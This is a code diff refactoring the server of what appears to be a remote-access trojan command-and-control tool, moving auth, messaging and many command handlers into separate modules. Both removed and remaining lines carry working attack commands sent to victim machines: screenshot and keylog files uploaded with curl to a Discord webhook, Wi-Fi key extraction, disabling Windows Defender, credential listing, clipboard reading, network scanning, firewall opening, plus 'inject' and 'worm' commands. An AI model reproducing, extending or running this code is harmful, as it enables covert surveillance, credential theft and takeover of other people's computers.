@@ -16,6 +16,15 @@ import sys
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from config import DISCORD_WEBHOOK, SERVER_IP, API_KEY as _CONFIG_API_KEY, CLIENT_PASSWORD
 
+try:
+    from .commands import CmdContext, command_registry  # package mode (tests)
+    from .auth import check_api_key, check_client_password
+    from .protocol import decode_message, encode_message, recv_exactly
+except ImportError:  # script mode (python C2/C2.py)
+    from commands import CmdContext, command_registry
+    from auth import check_api_key, check_client_password
+    from protocol import decode_message, encode_message, recv_exactly
+
 version = 11.7 #7/3/2026
 
 HOST = "0.0.0.0"
@@ -140,7 +149,7 @@ class ClientManager:
                     return None
 
                 password = password_data.decode('utf-8', errors='ignore').strip()
-                if password != CLIENT_PASSWORD:
+                if not check_client_password(password, CLIENT_PASSWORD):
                     print(f"[!] Invalid password from {addr[0]}")
                     conn.close()
                     return None
@@ -276,14 +285,9 @@ class ClientManager:
     def _send_message(self, conn, data):
         """Send data with length prefix"""
         try:
-            if isinstance(data, str):
-                data = data.encode('utf-8')
-
-            #Send length (4 bytes)
-            msg_len = len(data)
-            conn.sendall(struct.pack('!I', msg_len))
-            #Send data
-            conn.sendall(data)
+            length_packet, payload = encode_message(data)
+            conn.sendall(length_packet)
+            conn.sendall(payload)
             return True
         except Exception as e:
             print(f"[!] Send error: {e}")
@@ -291,42 +295,12 @@ class ClientManager:
 
     def _recv_message(self, conn):
         try:
-            #Receive the length (4 bytes)
-            raw_msglen = self._recv_exactly(conn, 4)
-            if not raw_msglen:
-                return None
-
-            #Check HTTP
-            if raw_msglen.startswith(b'GET ') or raw_msglen.startswith(b'POST') or raw_msglen.startswith(
-                    b'HTTP') or raw_msglen.startswith(b'HEAD'):
-                return None  # Silent close
-
-            try:
-                msglen = struct.unpack('!I', raw_msglen)[0]
-            except struct.error:
-                return None
-
-            if msglen > 10 * 1024 * 1024:  # 10MB limit
-                return None  # Silent close
-
-            #Receive the actual message
-            return self._recv_exactly(conn, msglen)
+            return decode_message(lambda n: self._recv_exactly(conn, n))
         except Exception:
             return None
 
     def _recv_exactly(self, conn, n):
-        data = b''
-        while len(data) < n:
-            try:
-                packet = conn.recv(n - len(data))
-                if not packet:
-                    return None
-                data += packet
-            except socket.timeout:
-                return None
-            except Exception:
-                return None
-        return data
+        return recv_exactly(conn, n)
 
 
 
@@ -342,7 +316,7 @@ class C2APIHandler(http.server.BaseHTTPRequestHandler):
     def _check_auth(self):
         """Check API key authentication"""
         api_key = self.headers.get('X-API-Key', '')
-        if api_key != self.API_KEY:
+        if not check_api_key(api_key, self.API_KEY):
             self._set_headers(401)
             self.wfile.write(json.dumps({'error': 'Unauthorized - Invalid API key'}).encode())
             return False
@@ -662,6 +636,9 @@ def interact_with_client(client_manager, client_id):
     username = client['username']
     addr = client['addr']
 
+    ctx = CmdContext(cm=client_manager, client=client, conn=conn,
+                     username=username, addr=addr, logger=discord_logger)
+
     print(f"\n[+] Connected to {username}@{addr[0]}")
     print("[+] Type 'back' to return to client selection, 'exit' to quit")
 
@@ -723,43 +700,6 @@ def interact_with_client(client_manager, client_id):
                 if client_manager._send_message(conn, f"CMD:{cmd}"):
                     time.sleep(1)
                 return 'exit'
-            elif cmd == 'screenshot':
-                command2 = (
-                    'powershell -command "'
-                    'Add-Type -AssemblyName System.Windows.Forms; '
-                    'Add-Type -AssemblyName System.Drawing; '
-                    '$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, '
-                    '[System.Windows.Forms.SystemInformation]::VirtualScreen.Height); '
-                    '$graphics = [Drawing.Graphics]::FromImage($bmp); '
-                    '$graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, '
-                    '[System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); '
-                    '$path = Join-Path $env:USERPROFILE \'screenshot.png\'; '
-                    '$bmp.Save($path)"'
-                )
-                path2 = "%USERPROFILE%\\screenshot.png"
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    discord_logger(f'Screenshot from [{username}]:')
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f'Screenshot Taken [{username}]')
-                    client['command_in_progress'] = False
-
-                command3 = f'curl -F "file=@{path2}" -F "content=Screenshot [{username}]" {DISCORD_WEBHOOK}'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command3}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    client['command_in_progress'] = False
-
             elif cmd == 'send':
                 path = input("FULL Path of file: ")
                 command2 = f'curl -F "file=@{path}" -F "content=File from [{username}]" {DISCORD_WEBHOOK}'
@@ -819,41 +759,6 @@ def interact_with_client(client_manager, client_id):
                     discord_logger(f"Photo Sent\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
-            elif cmd == 'devices':
-                command2 = 'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') { \'$env:USERPROFILE\\ffmpeg.exe\' } elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') { \'C:\\ffmpeg\\bin\\ffmpeg.exe\' } elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) { (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source } elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) { (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName } else { $null }; if ($ff) { & $ff -list_devices true -f dshow -i dummy } else { Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' "'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Devices [{username}]: {response.decode('utf-8', errors='ignore')}")
-                    client['command_in_progress'] = False
-
-            elif cmd == 'wifi':
-                command1 = 'netsh wlan show profiles'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command1}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    name = input("Select network: ")
-                    command2 = f'powershell -NoProfile -Command "netsh wlan show profile name=\\"{name}\\" key=clear | Select-String \'(Key Content|เนื้อหาคีย์|Key-Content)\\s*:\\s*(.+)$\''
-                    with client['lock']:
-                        if not client_manager._send_message(conn, f"CMD:{command2}"):
-                            client['command_in_progress'] = False
-                            break
-                        response2 = client_manager._recv_message(conn)
-                    if response2:
-                        print(response2.decode('utf-8', errors='ignore'))
-                        client['command_in_progress'] = False
-                        discord_logger(f"Wi-Fi password of [{username}] for the network: {name} is\n{response2.decode('utf-8', errors='ignore')}")
-
             elif cmd == 'extract':
                 path = input("FULL Path to file: ")
                 path2 = input("FULL path to extract: ")
@@ -867,32 +772,6 @@ def interact_with_client(client_manager, client_id):
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
                     discord_logger(f"Extracted File [{username}]: {path} to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
-                    client['command_in_progress'] = False
-
-            elif cmd == 'sys' or cmd == 'system':
-                command2 = 'systeminfo'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"(sys) [{username}]\n{response.decode('utf-8', errors='ignore')}")
-                    client['command_in_progress'] = False
-
-            elif cmd == 'task':
-                command2 = 'tasklist'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Tasks List [{username}]\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'copy':
@@ -909,34 +788,6 @@ def interact_with_client(client_manager, client_id):
                     print(response.decode('utf-8', errors='ignore'))
                     discord_logger(f"Copied [{username}] {path} to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
-
-            elif cmd == 'shutdown' or cmd == 'off':
-                command2 = 'shutdown /s /f /t 0'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    discord_logger(f'Shutting down (PC) [{username}] . . . .')
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Client [{username}] Shutdown\n\n{response.decode('utf-8', errors='ignore')}")
-                client['command_in_progress'] = False
-
-            elif cmd == 'restart':
-                command2 = 'shutdown /r /f /t 0'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    discord_logger(f'Restarting (PC) [{username}] . . . .')
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Client [{username}] Restarting\n\n{response.decode('utf-8', errors='ignore')}")
-                client['command_in_progress'] = False
 
             elif cmd == 'cut':
                 path = input("FULL path: ")
@@ -1004,58 +855,6 @@ def interact_with_client(client_manager, client_id):
                 discord_logger(f"Setting up 'ffmpeg' for [{username}]. Please Wait at least 10 Minutes.")
                 if response:
                     discord_logger(f"FFMPEG\n\n{response.decode('utf-8', errors='ignore')}")
-                client['command_in_progress'] = False
-
-            elif cmd == 'ip':
-                command2 = 'powershell -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Global IP for {username}: {response.decode('utf-8', errors='ignore')}")
-                client['command_in_progress'] = False
-
-            elif cmd == 'lock':
-                command2 = 'rundll32.exe user32.dll,LockWorkStation'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Locked User [{username}]\n{response.decode('utf-8', errors='ignore')}")
-                client['command_in_progress'] = False
-
-            elif cmd == 'disable task manager':
-                command2 = r'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Task Manager Disabled for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
-                client['command_in_progress'] = False
-
-            elif cmd == 'enable task manager':
-                command2 = r'REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Task Manager Enabled for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                 client['command_in_progress'] = False
 
             elif cmd == 'inject':
@@ -1226,19 +1025,6 @@ def interact_with_client(client_manager, client_id):
                     discord_logger(f"Played Audio {path} silently\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
-            elif cmd == 'recycle':
-                command2 = 'PowerShell.exe -NoProfile -Command Clear-RecycleBin -Force'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Emptied Recycle Bin on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
-                client['command_in_progress'] = False
-
             elif cmd == 'port':
                 port = input("Port: ")
                 command2 = f'netsh advfirewall firewall add rule name="PhantomLink{port}" dir=in action=allow protocol=TCP localport={port}'
@@ -1260,19 +1046,6 @@ def interact_with_client(client_manager, client_id):
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
                     discord_logger(f"{response.decode('utf-8', errors='ignore')}")
-
-            elif cmd == 'clipboard':
-                command2 = 'powershell -command "Get-Clipboard"'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Clipboard [{username}]: \n{response.decode('utf-8', errors='ignore')}")
-                client['command_in_progress'] = False
 
             elif cmd == 'kill':
                 sure = input("Are you sure? (y/n): ")
@@ -1338,18 +1111,6 @@ def interact_with_client(client_manager, client_id):
                     print(response.decode('utf-8', errors='ignore'))
                     discord_logger(f"PC [{username}] slept\n\n{response.decode('utf-8', errors='ignore')}")
 
-            elif cmd == 'rickroll':
-                command2 = 'start msedge --autoplay-policy=no-user-gesture-required "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1" || start https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"RickRoll video played on {username}\n\n{response.decode('utf-8', errors='ignore')}")
-                client['command_in_progress'] = False
             elif cmd == 'keylog':                #Send keylogger logs
                 command2 = f'curl -F "file=@%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\keylog.txt" -F "content=Keylog" {DISCORD_WEBHOOK}'
                 with client['lock']:
@@ -1445,19 +1206,6 @@ def interact_with_client(client_manager, client_id):
                     discord_logger(f"Sent all Browser saved data for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
-            elif cmd == 'netscan':
-                command2 = 'powershell -NoProfile -Command "$ipPrefix = ((Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notlike \'127.*\' -and $_.IPAddress -notlike \'169.254.*\' } | Select-Object -First 1).IPAddress -replace \'\\.\\d+$\'); if ($ipPrefix) { 1..254 | ForEach-Object { $target = \\"$ipPrefix.$_\\"; if (Test-Connection -ComputerName $target -Count 1 -Quiet -TimeoutMs 200) { \\"$target - $(Resolve-DnsName $target -ErrorAction SilentlyContinue | Select-Object -ExpandProperty NameHost -ErrorAction SilentlyContinue)\\" } } } else { Write-Error \'No active IPv4 interface found.\' }"'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"[{username}] netscan:\n{response.decode('utf-8', errors='ignore')}")
-                    client['command_in_progress'] = False
-
             elif cmd == 'screenrec':
                 duration = input("Duration (seconds): ")
                 command2 = f'powershell -Command "$ff = if (Test-Path \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Test-Path \'$env:USERPROFILE\\ffmpeg.exe\') {{ \'$env:USERPROFILE\\ffmpeg.exe\' }} elseif (Test-Path \'C:\\ffmpeg\\bin\\ffmpeg.exe\') {{ \'C:\\ffmpeg\\bin\\ffmpeg.exe\' }} elseif (Get-Command ffmpeg -ErrorAction SilentlyContinue) {{ (Get-Command ffmpeg -ErrorAction SilentlyContinue).Source }} elseif (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1) {{ (Get-ChildItem -Path \\"$env:USERPROFILE\\ffmpeg*\\" -Filter \\"ffmpeg.exe\\" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1).FullName }} else {{ $null }}; if ($ff) {{ Start-Process $ff -ArgumentList \'-f gdigrab -framerate 5 -i desktop -t {duration} -vcodec libx264 -preset ultrafast $env:USERPROFILE\\screen.mp4\' -NoNewWindow -Wait }} else {{ Write-Error \'[!] ffmpeg.exe not found. Please run ffmpeg setup first.\' }}"'
@@ -1481,53 +1229,6 @@ def interact_with_client(client_manager, client_id):
                 if response:
                     print(response.decode('utf-8', errors='ignore'))
                     discord_logger(f"Screen recorded for {duration}S\n\n{response.decode('utf-8', errors='ignore')}")
-                    client['command_in_progress'] = False
-
-            elif cmd == 'info':
-                command2 = '''powershell -Command "Get-ComputerInfo | Select OSName,OSVersion,WindowsVersion,CSName,CSDomain,BIOSManufacturer | Format-List; Get-WmiObject Win32_Battery | Select EstimatedChargeRemaining"'''
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Got all machine info of [{username}]:\n{response.decode('utf-8', errors='ignore')}")
-                    client['command_in_progress'] = False
-
-            elif cmd == 'killav':
-                command2 = 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
-                command3 = 'taskkill /F /IM MsMpEng.exe'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"Disabled Windows Defender AV on [{username}]\n\n {response.decode('utf-8', errors='ignore')}")
-                    client['command_in_progress'] = False
-                with client['lock']:
-                    if not client_manager._send_message(conn, f"CMD:{command3}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-
-            elif cmd == 'creds':
-                command2 = 'cmdkey /list > %TEMP%\\creds.txt'
-                with client['lock']:
-                    client['command_in_progress'] = True
-                    if not client_manager._send_message(conn, f"CMD:{command2}"):
-                        client['command_in_progress'] = False
-                        break
-                    response = client_manager._recv_message(conn)
-                if response:
-                    print(response.decode('utf-8', errors='ignore'))
-                    discord_logger(f"[{username}] Creds:\n{response.decode('utf-8', errors='ignore')}")
                     client['command_in_progress'] = False
 
             elif cmd == 'worm':
@@ -2223,6 +1924,14 @@ def interact_with_client(client_manager, client_id):
                 continue
             elif cmd == "":
                 continue
+            elif (cmd_obj := command_registry.get(cmd)) is not None:
+                result = cmd_obj.handler(ctx)
+                if result == 'exit':
+                    return 'exit'
+                elif result == 'break':
+                    break
+                elif result == 'continue':
+                    continue
             else:
                 #Send command with CMD prefix
                 start_time = time.time()
